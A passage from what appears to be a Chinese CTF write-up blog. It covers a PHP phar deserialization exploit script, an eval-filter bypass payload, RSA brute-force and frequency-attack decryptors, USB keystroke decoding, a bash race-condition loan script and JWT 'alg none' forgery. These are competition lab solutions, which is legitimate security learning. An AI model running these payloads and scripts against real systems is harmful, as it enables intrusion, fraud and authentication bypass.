(!isset($_SESSION['login'])) { header(\"Location: login.php\"); die();}if (!isset($_POST['filename'])) { die();}include \"class.php\";chdir($_SESSION['sandbox']);$file = new File();$filename = (string) $_POST['filename'];if (strlen($filename) &lt; 40 &amp;&amp; $file-&gt;open($filename)) { $file-&gt;detele(); Header(\"Content-type: application/json\"); $response = array(\"success\" =&gt; true, \"error\" =&gt; \"\"); echo json_encode($response);} else { Header(\"Content-type: application/json\"); $response = array(\"success\" =&gt; false, \"error\" =&gt; \"File not exist\"); echo json_encode($response);}?&gt; 其中$file-&gt;delete()时便执行了unlink()函数。 那么我们上传一个phar文件，再去删除它，此处便可以控制通过phar://执行了我们上传的phar文件，便将文件中序列化的内容反序列化了，利用这个部分，我们便可以构造phar文件，来读取flag文件了。 构造phar文件网上找到了构造phar文件的脚本： &lt;?phpclass User { public $db;}class File { public $filename;}class FileList { private $files; public function __construct() { $file = new File(); $file-&gt;filename = \"/flag.txt\"; $this-&gt;files = array($file); }}$a = new User();$a-&gt;db = new FileList();$phar = new Phar(\"phar.phar\"); //后缀名必须为phar$phar-&gt;startBuffering();$phar-&gt;setStub(\"&lt;?php __HALT_COMPILER(); ?&gt;\"); //设置stub$o = new User();$o-&gt;db = new FileList();$phar-&gt;setMetadata($a); //将自定义的meta-data存入manifest$phar-&gt;addFromString(\"exp.txt\", \"test\"); //添加要压缩的文件//签名自动计算$phar-&gt;stopBuffering();?&gt; 解题首先上传构造好的phar文件，这里需要注意：phar文件上传的时候必须伪装成image文件，通过BP抓包上传：然后删除文件，此时抓包，然后把要删除的文件名改为phar://phar.png/exp.txt，然后即可拿到flag： [RoarCTF 2019]Easy Calc网上有说这道题跟HTTP协议走私有关联，之前看过http走私的文章，但我觉得的更多的考察的就是参数过滤的绕过还有对输入字符做限制时候的绕过。不过这里可以再学习一下http走私，还学到了一些利用PHP的字符串解析特性Bypass的方法。 题目分析进入题目查看源码发现clac.php?num被ban了，同时在calc.php中可以拿到源码： &lt;?phperror_reporting(0);if(!isset($_GET['num'])){ show_source(__FILE__);}else{ $str = $_GET['num']; $blacklist = [' ', '\\t', '\\r', '\\n','\\'', '\"', '`', '\\[', '\\]','\\$','\\\\','\\^']; foreach ($blacklist as $blackitem) { if (preg_match('/' . $blackitem . '/m', $str)) { die(\"what are you want to do?\"); } } eval('echo '.$str.';');}?&gt; 首先对传参num进行了过滤，但是要想读出flag，又必须用num传参，这时候想到利用空格的绕过方法。补充一点知识： php的解析规则：当php进行解析的时候，如果变量前面有空格，会去掉前面的空格再解析，那么我们就可以利用这个特点绕过waf。 也就是说利用num传参就可以了。我们还看到/也被ban了，再想要查看目录下的内容，就需要借助一些系统函数了。利用chr()函数即可借助数字来构造被ban的字符，来最终读取flag，最终payload如下： /calc.php?%20num=file_get_contents(chr(47).chr(102).chr(49).chr(97).chr(103).chr(103))","link":"/2020/02/07/BUUCTF-web%E5%88%B7%E9%A2%98%E2%85%A0/"},{"title":"HackTM2020-WriteUp","text":"HackTM2020-WriteUp假期被“关禁闭”，看到战队发的比赛链接，虽然知道自己很菜，题目不是我可以做的，不过还是大胆尝试了，发现一些题目还比较简单[滑稽脸]，这里写一下部分题目的WP。 RSA#1这是一个简单的RSA爆破题。 题目分析题目给了两个附件：c、rsa.py，其中c的内容如下： Public key:(65537, 28150970547901913019901824364390497053600856369839321617996700606130553862041378369018779003752433356889118526332329074054728613209407037089320809898343953157935211086135010436283805891893636870991411236307901650696221491790470635225076251966300189483160148297407974155121570252648252906976186499329924342873)Encrypted flag:[24603931406187071861602497345394097692989773194039735745762181586628499407802825983901643034231448504738113184470035863824128031443012073830520233613935485192804104698999763287388765215634314977991988580048221541560353418280294402691661980705832590960497587810514295642811714680627768268704899874164681718449, 11226318059664066669163529308725576208632153806776762372429671026861927737060205604020741904348343722215670471225630839065129589767356765848271000166982882271636977663052775953958080543340165408211633442938366994031562890034541604362383645601883118173819506187865617998294930587997187071040181458961091560176, 15645290594995180815865397749136800126080704684884296404807344870555186823350216705796063922278419585484662234210001661578549560411864952462380096494781766394542247609648743673312823946783517115542404474786395934886667795692210287283039316418126796934535150832709500306153601987121172178183970841498331059732, 24345863558959407738249127568820138362115734211146549194534219311913032290216606859385934708675962835857804566049600710875035366973110422262131331932310524891713319358676673958738776644229757625523955354996402750265022578843637525183704187498194489645838490640529841182709661371499013082259193633000753627261, 9620679224297488175028367924764722982789333194446063577221477359704180638294602848741035585656113543497776415635770748468725814916994577398023154224563920936523717884116880223345204061598438291740007518025998041449406726084042681798053863495542392481059281588020105313791046017356493739244555377217866496734, 1681724029430984846089508679185107538104072555994133932050319175633667369916570440070548756805254789524599169177371471218251246349461689959989338169394649813424706418737543924129213419625988100326558802566046751879531469160120914735332858786199496335523515150741728027296830843112416558460932541777024522279, 20629854768856798537062426042570334097651328955665698429979954410631113160492201197690192324881508105172595216229624523572595589920695165876501026993810936392510720968159305964832449680889041278532807173859579419197780294984519222830572413180237776797800176462492384318120546495539728732366110782215071262307, 7440918084186181327822271261394344901791253526257166181264874776746516620936925799031445704193589071453959493392065321806281801023425299535553522582376879027448581379760896052013060957519595664095702210758316558762834545655992756483227787274192094065257224706388623944855362716578806372564148647945479173348, 5097867843777034076271397095201528351784693372027998615436445410912131141882225577577253530396333413579756394884096318434100382509189974240357351425474190558456256750742731090012822064840481143528081027106843123030275420215136304130321013605031261372665636366377162666476737296028608455229357416005773064242, 10420107412794383499391199999666100864853724770814620968725971207705900061273163202891569477729023724554388008575891113425781557296798472693974759813058067631655217722786373465395279381307973425004404348124524059844749313287030234750535347511172780349725636807760402334957881556461382950021814486095167001394, 20895198446192697825002890636650624361863759520944494391240191454443921345578043873584884838772334163748883476104011030592329948454531053024873263786017045083052443924403769542324123323834338391361149767913830998218951574784777785739566046139742309557536025214334831372509789246522325522982945241815388133477, 11226318059664066669163529308725576208632153806776762372429671026861927737060205604020741904348343722215670471225630839065129589767356765848271000166982882271636977663052775953958080543340165408211633442938366994031562890034541604362383645601883118173819506187865617998294930587997187071040181458961091560176, 16657126895659048065404729920028465477385009450133540950695155983380795627778054526133891673615252510518969355629562948102050307259107355106086468465392660721567070464708776158039303608428552547481825035736610837329720474688421062759594907620576318249542577396722737724172954532394471909440668625218820801756, 11113777356910731413424023299582648618258376222028450254478672148119889617557563576704932635131420845868165014982665717620845578039880527701593963719893467068820107811384041511295664833904504511210342105242330522375476482706044695838957591685781703894244561607764476555630573446589408768780659378128082633769, 20895198446192697825002890636650624361863759520944494391240191454443921345578043873584884838772334163748883476104011030592329948454531053024873263786017045083052443924403769542324123323834338391361149767913830998218951574784777785739566046139742309557536025214334831372509789246522325522982945241815388133477, 1681724029430984846089508679185107538104072555994133932050319175633667369916570440070548756805254789524599169177371471218251246349461689959989338169394649813424706418737543924129213419625988100326558802566046751879531469160120914735332858786199496335523515150741728027296830843112416558460932541777024522279, 5237767970074646857079948735567615361735616179074197239639640947679550920349684166643572837235712904929824521258264241503059989875517915784117038966236672390569320206379357882906463342282254405974383459878863044723383164329146669331810709270455492110346838097216174137176255793792848357953314563364460847842, 20895198446192697825002890636650624361863759520944494391240191454443921345578043873584884838772334163748883476104011030592329948454531053024873263786017045083052443924403769542324123323834338391361149767913830998218951574784777785739566046139742309557536025214334831372509789246522325522982945241815388133477, 2141625583250052666579569568613448089970148215959031795439930595139028085767825695294403905882459409861220995951141855281841435481587946825079031782977651718402048988278639212978854590412709087674713750292922397103941195760574072700517109381299788645871729355745594573785064162048047595009933642068871994670, 278354276293884030290100330445865286604723740111170856624965259573282278044823323212960304154629174664076141280100412502135750130875356944835909175355370317285768658282746817782130476757714384697086179400629156643250500432197002583758692394681401772203578628635926749457621478296182304772136118691761841359, 6039667595601233082552071610487048398346324705021423176423484623705376133358539134558362499891954091431687578305623106726900655384011241742715735786166290331136153240702822544221903404870992713778423167867663948083662620087859096707381620051266745156545213726214080049764382107442159825610310695543673475542, 21353765873487781085375016306418205544750755310255410963646737671193146222650262290683259548572190880304009015662963424520575937651278866672082973874806201031606257157229306007587966460187818647603633973019548401357989358306250139692325474674826791149726161678649996852062656272851387461089863388359261125336, 11226318059664066669163529308725576208632153806776762372429671026861927737060205604020741904348343722215670471225630839065129589767356765848271000166982882271636977663052775953958080543340165408211633442938366994031562890034541604362383645601883118173819506187865617998294930587997187071040181458961091560176, 20576388598886140095325204584799302384454378372204683348252463729525849583734948105765087991438423260690623246579570440405616572326057536248148020737810766134083795050076636686776809469271643188562482921546497071402873405706504773345621716428511481598704631451463399778602486417840466985891815649711178813963, 17347447662661486040040289855519394974371562320877472776529836975445205017304164550202099250096382852783253959549113036367974281750823938616836362593312254792770954856762797438690474329666549947795964992533463700161635382925555835347885819042031312006167190561233042383984087765920275010577545908085026177611, 11788628214684738246695632901992250075758959059858474645166125685861157046466064692980236734739634298802473894878268029860203026238925142258303727438570051822763330338744774300757888262747314093511013562545738571326771345495509434761853742569509480619380000424215527153118231084573851377049921456961916278761, 20895198446192697825002890636650624361863759520944494391240191454443921345578043873584884838772334163748883476104011030592329948454531053024873263786017045083052443924403769542324123323834338391361149767913830998218951574784777785739566046139742309557536025214334831372509789246522325522982945241815388133477, 2141625583250052666579569568613448089970148215959031795439930595139028085767825695294403905882459409861220995951141855281841435481587946825079031782977651718402048988278639212978854590412709087674713750292922397103941195760574072700517109381299788645871729355745594573785064162048047595009933642068871994670, 2710029303357232932696197225263692040597986927359269224740812600224998707144266259851604978553286889767425982708691908438984279442981540971935737617354609856642312100797081348174935195638083002333058089328102430432526612805955273581245352312630845237670744276402867230550537275379675828467791243032108754996, 19981107233593350929447953514006501458466479260151660185153999799085657467921097940751860717309377498501638075002136637344148955811617399850718322497572421311807629329642551519284713638882025500074565475569618691516951449764680555447185364165687596161053684299589053909233984617244886185728811651967713024530, 3975884358027162862622932959187611984655247354547659825042810425039322096401899672988989768997134724085482147901304365437476311647149733392577446833370358728610677436154877051592307539990184750467273668379065865808900410057533079113476991204462719784464847498582643056503810805516315622314948257403761762299, 6039667595601233082552071610487048398346324705021423176423484623705376133358539134558362499891954091431687578305623106726900655384011241742715735786166290331136153240702822544221903404870992713778423167867663948083662620087859096707381620051266745156545213726214080049764382107442159825610310695543673475542, 14296542628093736444815382636071360035549021313467366701986569710120268508807886041986007828960248665683292143486565404978073122476968882030310174125355932205646388813061197657253533595700948593692407928813318978600474254105007396254987998953819782624738628334271910759242195864082910860797444993756044746481, 20895198446192697825002890636650624361863759520944494391240191454443921345578043873584884838772334163748883476104011030592329948454531053024873263786017045083052443924403769542324123323834338391361149767913830998218951574784777785739566046139742309557536025214334831372509789246522325522982945241815388133477, 7983594351048693624291138893287137601848867970873700373034058935656045095987011116108642350616654713531373295621458596238107660073931212524833777531450461876588350132328332972361857441613098452082271331281504722310376573085001395356078670960667878342134517577992585442881605030717788248137764480486762452442, 7983594351048693624291138893287137601848867970873700373034058935656045095987011116108642350616654713531373295621458596238107660073931212524833777531450461876588350132328332972361857441613098452082271331281504722310376573085001395356078670960667878342134517577992585442881605030717788248137764480486762452442, 23267174349531278768420819619439317179083929128083924515569762521057285892931325108327037262091624670335579302436476096123152288550738706103166820604983405317430467198343871458522070337902643863890959573514405066297449924638838605501211486861582957963752388608487593217237563529201436917108304692859773404548] 易知，该文件提供了RSA的公钥：(e,n)，以及加密后的flag，我们发现，flag的密文是多个大数，可知是逐字节对flag进行加密的，那么进行简单的爆破即可解密。 再来看看rsa.py的内容： import randomfrom my_math import next_primefrom flag import flagdef egcd(a, b): x, y, u, v = 0, 1, 1, 0 while a != 0: q, r = b//a, b % a m, n = x-u*q, y-v*q b, a, x, y, u, v = a, r, u, v, m, n gcd = b return gcd, x, ydef gen_keys(p, q): e = 65537 n = p * q phi = (p - 1) * (q - 1) gcd, d, b = egcd(e, phi) # Keys:((pub), (priv)) return ((e, n), (d, n))def enc(key, p): e, n = key cipher = [pow(ord(char), e, n) for char in p] return cipherdef dec(pk, c): key, n = pk plain = [chr(pow(char, key, n)) for char in c] return ''.join(plain)p = next_prime(random.SystemRandom().getrandbits(512))q = next_prime(random.SystemRandom().getrandbits(512))flag_key=gen_keys(p, q)print(\"Public key:\")print(flag_key[0])flag_c=(enc(flag_key[0], flag))print(\"Encrypted flag:\")print(flag_c) 该脚本中是一些RSA的加密、解密函数，其中提供了p和q都是512bit的素数，因此模数n是1024bit的，打消分解n的念头（这里不得不说一下，有些比赛的1024bit以上的模数n在http://factordb.com/ 上是有上传的，有时候可以先拿去分解试试）我们从enc函数的加密机制发现，它是对明文进行逐字符进行加密，再次印证了是逐字节爆破，直接爆破flag即可。 解密代码import stringwith open('c', 'r') as f: data = f.read().split('\\n') e = int(data[1].split(', ')[0][1:]) n = int(data[1].split(', ')[1][:-1]) flag_enc = [int(x) for x in data[4][1:-1].split(', ')]flag = ''for f in flag_enc: for c in string.printable: if pow(ord(c), e, n) == f: flag += c breakprint(flag) RSA#2题目分析与上个题目一样，附件中包含两个文件c、rsa.py，并且rsa.py与上题一样： import randomfrom my_math import next_primefrom flag import flagdef egcd(a, b): x, y, u, v = 0, 1, 1, 0 while a != 0: q, r = b//a, b % a m, n = x-u*q, y-v*q b, a, x, y, u, v = a, r, u, v, m, n gcd = b return gcd, x, ydef gen_keys(p, q): e = 65537 n = p * q phi = (p - 1) * (q - 1) gcd, d, b = egcd(e, phi) # Keys:((pub), (priv)) return ((e, n), (d, n))def enc(key, p): e, n = key cipher = [pow(ord(char), e, n) for char in p] return cipherdef dec(pk, c): key, n = pk plain = [chr(pow(char, key, n)) for char in c] return ''.join(plain)p = next_prime(random.SystemRandom().getrandbits(512))q = next_prime(random.SystemRandom().getrandbits(512))flag_key=gen_keys(p, q)print(\"Public key:\")print(flag_key[0])flag_c=(enc(flag_key[0], flag))print(\"Encrypted flag:\")print(flag_c) 但是密文文件c内容不同，其中给出了逐字节加密的密文列表，但是并未给出公钥： Public key:[DATA CORRUPTED]Encrypted flag:[34220770932871364013976724839545041417474666615300575941746695940071552482886462087439379719184240006479394129946558717984964307444237521284361087031583504037093765914149168694482266218524635203263596760639253965500892625668716519628460563860957678979373258071483670494006067028836185890388591731283716604832...]这里列表中共有1111个字符的密文 没有公钥，怎么解密？？？显然也不是攻击私钥，而是直接对密文进行攻击。我们看到，密文列表中有1111个密文，一般的flag不可能这么长，而这里给出了这么多密文，并且没有给出公钥，解密思路便很显然：利用字母频率攻击出明文。这也是密码学常用的攻击方法之一，主要思路是：英文的字母在使用中出现的次数大致满足了一个频率表(参考https://en.wikipedia.org/wiki/Letter_frequency )，我们可以把这1111个密文的出现频率统计出来，然后与字母频率对应，从而攻击出明文。 解密代码with open('c', 'r') as f: data = f.read().split('\\n') flag_enc = [int(x) for x in data[4][1:-1].split(', ')]freq_dict = {}for f in flag_enc: if not f in freq_dict: freq_dict[f] = 1 else: freq_dict[f] += 1freq = sorted(list(freq_dict.items()), key=lambda x: x[1])freq.reverse()english_freq = [' ', 'E','T','A','I','N','O','R','S','L','H', 'C','M','D','Y','P','U','W','F','G','.','V', 'B','X','K',',','Q', 'Z', '\\'', '0', '9']translator = {}for i, c in enumerate(english_freq): translator[freq[i][0]] = cfor f in flag_enc: if f in translator: print(translator[f], end='') The Dragon Sleeps At Night一道misc题，考脑洞，也考基本知识，多做misc确实能开眼界啊！ 题目分析netcat连接目标IP之后进入一个游戏盒，秉承misc一大传统：打游戏。这个题目是一个屠龙的游戏，从图中可以看到，有以下功能：去商店：这里有从1级到5级的屠龙宝刀，屠龙！拿flag~去工作：赚钱买刀！屠龙！拿flag~去龙穴：屠龙！拿flag~回家：休息，为了屠龙！拿flag~储藏室：放宝刀 解题关键点： 1、这里去工作的话最后拿工资的时候会让输入工作天数，1刀/天，但是每次之多输入三个字符，因此常数的话最多999…怎么办呢？ 2、回家休息的时候可以输入休息的天数，但是休息会“降低”储藏室中宝刀的级别，1级/天，不过…休息天数正负不限~这两点就是屠龙的关键。 解题根据前面的分析，我们需要先去工作赚钱，在结账的时候输入9e9的话其实就可以得到9 billion刀，这足以买到5级宝刀了。其实就是利用科学计数法绕过限制，CTF中很多题目借用了这一点。此时去屠龙的话，仍然会失败，因为需要6级宝刀，但是商店没有啊！利用关键点2，我们先买5级宝刀并放在储藏室，然后去睡-1天，便得到了一把6级宝刀，再去屠龙便能顺利拿到flag了。 Strange PCAP考察流量包隐写、usb数据分析 题目分析下载数据包的时候，压缩工具就提示要输入密码，但是是个流量包，直接能打开，输密码干嘛？用binwalk分析一下，发现存在压缩包隐写，binwalk -e提取但是解压需要密码，那就看看数据包里的内容，发现是usb数据，估计就是键盘记录或者鼠标记录了利用常规的方法：把usb数据提取出来，然后用现有的跑键盘记录的脚本跑出来即可。先利用tshark提取数据： tshark -r Strange.pcapng -T fields -e usb.capdata | sed '/^\\s*$/d' &gt; usbdata.txt//加上\"| sed '/^\\s*$/d'\"是因为直接提取的话会有很多空行，加上这一句空行就没了 发现提取的数据如下： 00000001040001000000000000000000000104000100000000000000000100000000000000000000000000000000000000000000210008210010210012000024000000000000000000000000000000190000000000000000000000000000000a0000000000000000000000000000000d0000000000000000000000000000002100000000000000000000000000020000000000000002001600000000000200000000000000020016000000000002000000000000000000000000000000200000000000000020000f00000000000000000000000000000026000000000000000000000000002000000000000000200011000000000020000000000000000000000000000000200000000000000020000b000000000020000000000000000000000000000000200000000000000020001900000000002000000000000000000000000000000000001800000000000000000000000000020000000000000002000e000000000002000000000000000000000000000000000027000000000000000000000000000200000000000000020007000000000002000000000000000000000000000000000023000000000000000000000000000000070000000000000000000000000000002000000000000000000000000000020000000000000002000900000000000200000000000000000000000000000000002800000000000000000000000000210010 直接用脚本跑键盘记录的话，结果如下：可以看到结果不正常，因为上面的数据有很多冗余数据(长度不是8字节的部分)，去掉之后再跑脚本，结果如下：输入密码，即可拿到flag： 键盘记录脚本本题用国内的通用脚本解不出来，用国外wp的脚本可以 #经夏风师傅完善过的国外脚本usb_codes = { 0x04:\"aA\", 0x05:\"bB\", 0x06:\"cC\", 0x07:\"dD\", 0x08:\"eE\", 0x09:\"fF\", 0x0A:\"gG\", 0x0B:\"hH\", 0x0C:\"iI\", 0x0D:\"jJ\", 0x0E:\"kK\", 0x0F:\"lL\", 0x10:\"mM\", 0x11:\"nN\", 0x12:\"oO\", 0x13:\"pP\", 0x14:\"qQ\", 0x15:\"rR\", 0x16:\"sS\", 0x17:\"tT\", 0x18:\"uU\", 0x19:\"vV\", 0x1A:\"wW\", 0x1B:\"xX\", 0x1C:\"yY\", 0x1D:\"zZ\", 0x1E:\"1!\", 0x1F:\"2@\", 0x20:\"3#\", 0x21:\"4$\", 0x22:\"5%\", 0x23:\"6^\", 0x24:\"7&amp;\", 0x25:\"8*\", 0x26:\"9(\", 0x27:\"0)\", 0x2C:\" \", 0x2D:\"-_\", 0x2E:\"=+\", 0x2F:\"[{\", 0x30:\"]}\", 0x32:\"#~\", 0x33:\";:\", 0x34:\"'\\\"\", 0x36:\",&lt;\", 0x37:\".&gt;\", 0x38:\"/?\", 0x39:\"&lt;CAP&gt;&lt;CAP&gt;\", 0x3a:\"&lt;F1&gt;&lt;F1&gt;\", 0x3b:\"&lt;F4&gt;&lt;F4&gt;\", 0x3e:\"&lt;F5&gt;&lt;F5&gt;\",0x3f:\"&lt;F6&gt;&lt;F6&gt;\", 0x40:\"&lt;F7&gt;&lt;F7&gt;\",0x41:\"&lt;F8&gt;&lt;F8&gt;\",0x42:\"&lt;F9&gt;&lt;F9&gt;\",0x43:\"&lt;F10&gt;&lt;F10&gt;\", 0x44:\"&lt;F11&gt;&lt;F11&gt;\",0x45:\"&lt;F12&gt;&lt;F12&gt;\"}data = ''for x in open(\"usb.txt\",\"r\").readlines(): code = int(x[4:6],16) print(x[4:6]) if code == 0: continue if code == 0x28: print('ENTER!') print(data) data = '' continue upper = 0 if int(x[0:2],16) == 0x02 or int(x[0:2],16) == 0x20: upper = 1 data += usb_codes[code][upper]print(data) 再附一个国内的脚本： normalKeys = { \"04\":\"a\", \"05\":\"b\", \"06\":\"c\", \"07\":\"d\", \"08\":\"e\", \"09\":\"f\", \"0a\":\"g\", \"0b\":\"h\", \"0c\":\"i\", \"0d\":\"j\", \"0e\":\"k\", \"0f\":\"l\", \"10\":\"m\", \"11\":\"n\", \"12\":\"o\", \"13\":\"p\", \"14\":\"q\", \"15\":\"r\", \"16\":\"s\", \"17\":\"t\", \"18\":\"u\", \"19\":\"v\", \"1a\":\"w\", \"1b\":\"x\", \"1c\":\"y\", \"1d\":\"z\",\"1e\":\"1\", \"1f\":\"2\", \"20\":\"3\", \"21\":\"4\", \"22\":\"5\", \"23\":\"6\",\"24\":\"7\",\"25\":\"8\",\"26\":\"9\", \"27\":\"0\",\"28\":\"&lt;RET&gt;\",\"29\":\"&lt;ESC&gt;\",\"2a\":\"&lt;DEL&gt;\", \"2b\":\"\\t\", \"2c\":\"&lt;SPACE&gt;\",\"2d\":\"-\",\"2e\":\"=\",\"2f\":\"[\",\"30\":\"]\",\"31\":\"\\\\\", \"32\":\"&lt;NON&gt;\",\"33\":\";\",\"34\":\"'\",\"35\":\"&lt;GA&gt;\",\"36\":\",\",\"37\":\".\", \"38\":\"/\",\"39\":\"&lt;CAP&gt;\",\"3a\":\"&lt;F1&gt;\",\"3b\":\"&lt;F2&gt;\", \"3c\":\"&lt;F3&gt;\",\"3d\":\"&lt;F4&gt;\", \"3e\":\"&lt;F5&gt;\",\"3f\":\"&lt;F6&gt;\",\"40\":\"&lt;F7&gt;\",\"41\":\"&lt;F8&gt;\",\"42\":\"&lt;F9&gt;\",\"43\":\"&lt;F10&gt;\", \"44\":\"&lt;F11&gt;\",\"45\":\"&lt;F12&gt;\"}shiftKeys = { \"04\":\"A\", \"05\":\"B\", \"06\":\"C\", \"07\":\"D\", \"08\":\"E\", \"09\":\"F\", \"0a\":\"G\", \"0b\":\"H\", \"0c\":\"I\", \"0d\":\"J\", \"0e\":\"K\", \"0f\":\"L\", \"10\":\"M\", \"11\":\"N\", \"12\":\"O\", \"13\":\"P\", \"14\":\"Q\", \"15\":\"R\", \"16\":\"S\", \"17\":\"T\", \"18\":\"U\", \"19\":\"V\", \"1a\":\"W\", \"1b\":\"X\", \"1c\":\"Y\", \"1d\":\"Z\",\"1e\":\"!\", \"1f\":\"@\", \"20\":\"#\", \"21\":\"$\", \"22\":\"%\", \"23\":\"^\",\"24\":\"&amp;\",\"25\":\"*\",\"26\":\"(\",\"27\":\")\", \"28\":\"&lt;RET&gt;\",\"29\":\"&lt;ESC&gt;\",\"2a\":\"&lt;DEL&gt;\", \"2b\":\"\\t\",\"2c\":\"&lt;SPACE&gt;\", \"2d\":\"_\",\"2e\":\"+\",\"2f\":\"{\",\"30\":\"}\",\"31\":\"|\",\"32\":\"&lt;NON&gt;\",\"33\":\"\\\"\", \"34\":\":\",\"35\":\"&lt;GA&gt;\",\"36\":\"&lt;\",\"37\":\"&gt;\",\"38\":\"?\",\"39\":\"&lt;CAP&gt;\",\"3a\":\"&lt;F1&gt;\", \"3b\":\"&lt;F2&gt;\", \"3c\":\"&lt;F3&gt;\",\"3d\":\"&lt;F4&gt;\",\"3e\":\"&lt;F5&gt;\",\"3f\":\"&lt;F6&gt;\",\"40\":\"&lt;F7&gt;\", \"41\":\"&lt;F8&gt;\",\"42\":\"&lt;F9&gt;\",\"43\":\"&lt;F10&gt;\",\"44\":\"&lt;F11&gt;\",\"45\":\"&lt;F12&gt;\"}output = []keys = open('usbdata.txt')for line in keys: try: if line[0]!='0' or (line[1]!='0' and line[1]!='2') or line[3]!='0' or line[4]!='0' or line[9]!='0' or line[10]!='0' or line[12]!='0' or line[13]!='0' or line[15]!='0' or line[16]!='0' or line[18]!='0' or line[19]!='0' or line[21]!='0' or line[22]!='0' or line[6:8]==\"00\": continue if line[6:8] in normalKeys.keys(): output += [[normalKeys[line[6:8]]],[shiftKeys[line[6:8]]]][line[1]=='2'] else: output += ['[unknown]'] except: passkeys.close()flag=0print(\"\".join(output))for i in range(len(output)): try: a=output.index('&lt;DEL&gt;') except: passfor i in range(len(output)): try: if output[i]==\"&lt;CAP&gt;\": flag+=1 output.pop(i) if flag==2: flag=0 if flag!=0: output[i]=output[i].upper() except: passprint ('output :' + \"\".join(output)) 这里再拓展一下，usb流量一般是鼠标流量或者是键盘流量，可以参考这里。提供一位师傅的工具。 My Bank一道web的条件竞争题目 题目分析常见的一种题，可以去银行贷款，不过最多贷款600刀，还能去商店买东西，饼干最便宜，但是没法吃，还是买flag吧，但是要1440刀…分析可知，可以利用条件竞争进行贷款，这样就可以拿到不止600刀的资金，再去买flag即可。条件竞争可参考：https://blog.csdn.net/qq_36992198/article/details/80007405 解题1、利用BP解题 抓包 放到爆破模块，设置空payload，线程设为15 借到足够的钱去买flag 首先注册账号并登陆，看一下我们的账户信息：可以看到，我们还可以借600刀，然后设置借钱为100，BP抓包进行爆破，用13-15个线程即可，结果如下：然后回到我们的账户处查看利用条件竞争借到的1000刀已经到账:这里需要多次尝试才能借到足够的钱数，每次结果都可能是不一样的。因为利用BP进行条件竞争的时候有时候会受到网速、服务质量等各种因素的影响，多试几次就好了。 2、BASH脚本看国外大佬的解题思路学到了一种利用bash脚本进行条件竞争的方式(其实用python也一样)，脚本如下： #!/bin/bashurl=\"http://178.128.175.6:50090/\"ua=\"User-Agent: Mozilla/5.0\"cookie=\"session=.eJwNy0sKAjEMANC7ZG1hmmTy8TLStAmIoKDOSry7vv37wHw96_J-3PIOZwhCNNlimhOPlTor3IYOWjkijbOHFBac4Diu6z-Ute9SvWGZNaaNm3tko4mdQnRXF_j-AEMAHN8.Xjaggw.o-B9vO_i0Fnredto0K7aoEXTCGI\"ssrf=`curl -s \"$url\" -H \"$ua\" -H \"Cookie: $cookie\" 2&gt;&amp;1 | pcregrep -o1 'name=\\\"csrf_token\\\" type=\\\"hidden\\\" value=\\\"(.*)\\\"' -`for i in `seq 15`; do curl \"$url\" -H \"$ua\" -H \"Cookie: $cookie\" --data \"csrf_token=$ssrf&amp;loan=100\" &amp;; donesleep 6 &amp;&amp; echo \"[*] maybe haxed?\" &amp;&amp; curl -s 'http://178.128.175.6:50090/' -H \"$ua\" -H \"Cookie: $cookie\" 2&gt;&amp;1 | pcregrep -o1 \"Money: (.*) tBTC\" 这里利用了一个技巧：在cURL命令之后附加一个&amp;使进程移到后台。这样，可以同时发出多个请求，并且不需要编写一个处理多线程的复杂代码。 Draw With Us一个JWT攻击题目，进入题目是下图的一个改颜色的web端游戏，给出Hint：Changing your color is the first step towards happiness.同时题目还给了一个json附件，实现代码都在其中，其中包含关键部分： NodeJS Express服务器 登录/管理员管理/socket.io JWT算法：HMAC-SHA256 管理员用户名：hacktm 题目分析&amp;一些攻击尝试破解JWT秘钥代码中获取flag的函数如下： app.get(\"/flag\", (req, res) =&gt; { // Get the flag // Only for root if (req.user.id == 0) { res.send(ok({ flag: flag })); } else { res.send(err(\"Unauthorized\")); } 想要得到flag，就必须满足req.user.id == 0，那么就需要想办法构造JWT。看国外大佬的WP写的对JWT秘钥进行攻击，但是没有成功。 暴力破解n下面这段代码给出了req.user.id的生成算法： app.post(\"/init\", (req, res) =&gt; { // Initialize new round and sign admin token // RSA protected! // POST // { // p:\"0\", // q:\"0\" // } let { p = \"0\", q = \"0\", clearPIN } = req.body; let target = md5(config.n.toString()); let pwHash = md5( bigInt(String(p)) .multiply(String(q)) .toString() ); if (pwHash == target &amp;&amp; clearPIN === _clearPIN) { // Clear the board board = new Array(config.height) .fill(0) .map(() =&gt; new Array(config.width).fill(config.backgroundColor)); boardString = boardToStrings(); io.emit(\"board\", { board: boardString }); } //Sign the admin ID let adminId = pwHash .split(\"\") .map((c, i) =&gt; c.charCodeAt(0) ^ target.charCodeAt(i)) .reduce((a, b) =&gt; a + b); console.log(adminId); res.json(ok({ token: sign({ id: adminId }) }));}); 代码中的p和q是用户输入，n是秘钥。由于md5的结果为32个字符，且target长度与pwHash相同，同时toString暗示n是数字。adminId是利用target计算的，每个字符都经过了XOR运算。在map()的迭代中，两个字符相同的结果即为0，最后通过reduce()会计算出所有数的结果，若0，则req.user.id==0。然而，如果哈希值不匹配的话，req.user.id就会是一个大于0的数字。由于reduce()消除线性搜索推导的可能性，因此无法现实地对此进行暴力破解n，必须找到另一种方式。 JWT none 攻击这种攻击方法可参考：https://www.sjoerdlangkemper.nl/2016/09/28/attacking-jwt-authentication/ 1、替换或者更改JWT有效负载 2、更改id，如{&quot;id&quot;:1374,&quot;iat&quot;:1580560256} -&gt; {&quot;id&quot;:0,&quot;iat&quot;:1580560256} 3、删除签名 4、更改{&quot;typ&quot;:&quot;JWT&quot;,&quot;alg&quot;:&quot;HS256&quot;}-&gt;&quot;alg&quot;: &quot;none&quot; 5、提交服务器但是该方法也不行。 总之，关键点就在于： 1、使req.user.id==0 2、为了实现1需要得到config.n 3、可能有其他方式得到config.n或者config.p 从下面一段代码可以得到新的思路： app.get(\"/serverInfo\", (req, res) =&gt; { // Get server info // Only for logged in users let user = users[req.user.id] || { rights: [] }; let info = user.rights.map(i =&gt; ({ name: i, value: config[i] })); res.json(ok({ info: info }));}); 应该是利用user.rights作为访问key直接读取对象的代码，如果可以插入自己的user.rights，便可以插入n从而得到config.n的值。然后发现另一段更新用户数据的代码： app.post(\"/updateUser\", (req, res) =&gt; { // Update user color and rights // Only for admin // POST // { // color: 0xDEDBEE, // rights: [\"height\", \"width\", \"usersOnline\"] // } let uid = req.user.id; let user = users[uid]; if (!user || !isAdmin(user)) { res.json(err(\"You're not an admin!\")); return; } let color = parseInt(req.body.color); users[uid].color = (color || 0x0) &amp; 0xffffff; let rights = req.body.rights || []; if (rights.length &gt; 0 &amp;&amp; checkRights(rights)) { users[uid].rights = user.rights.concat(rights).filter(onlyUnique); } res.json(ok({ user: 